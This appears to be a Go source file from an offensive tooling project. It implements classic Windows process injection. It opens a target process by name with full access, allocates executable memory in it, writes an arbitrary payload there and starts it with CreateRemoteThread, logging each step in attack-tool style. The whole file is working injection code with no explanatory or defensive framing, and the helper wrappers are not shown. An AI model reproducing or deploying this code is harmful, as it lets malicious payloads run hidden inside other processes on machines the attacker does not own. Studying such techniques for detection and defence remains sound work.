package main

import "os"
import "fmt"
import "unsafe"



func CreateRemoteThread_Injection(process_name string, payload []byte){
   var proc_handles_slice []uintptr = GetProcessByName(process_name);
   var first_proc = proc_handles_slice[0];
   var pid uintptr = GetProcessId(first_proc);
   fmt.Println("[+] Process PID: \t\t", pid);

   // OpenProcess
   var proc_handle uintptr = OpenProcess(0x001F0FFF, 0, pid);
   if (proc_handle == 0){
      fmt.Println("[-] OpenProcess API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Process handle: \t\t", fmt.Sprintf("0x%x", proc_handle));

   // VirtualAllocEx
   var assigned_address uintptr = VirtualAllocEx(proc_handle, 0, 0x1000, 0x3000, 0x40);
   if (assigned_address == 0){
      fmt.Println("[-] VirtualAllocEx API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Assigned address: \t\t", fmt.Sprintf("0x%x", assigned_address));

   // WriteProcessMemory
   var res uintptr = WriteProcessMemory(proc_handle, assigned_address, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)));
   if (res == 0){
      fmt.Println("[-] WriteProcessMemory API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] WriteProcessMemory response:", res);


   // CreateRemoteThread
   res = CreateRemoteThread(proc_handle, 0, 0, assigned_address, 0, 0, 0);
   if (res == 0){
      fmt.Println("[-] CreateRemoteThread API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Created thread id: \t\t", res);
   
   // CloseHandle
   CloseHandle(proc_handle);
}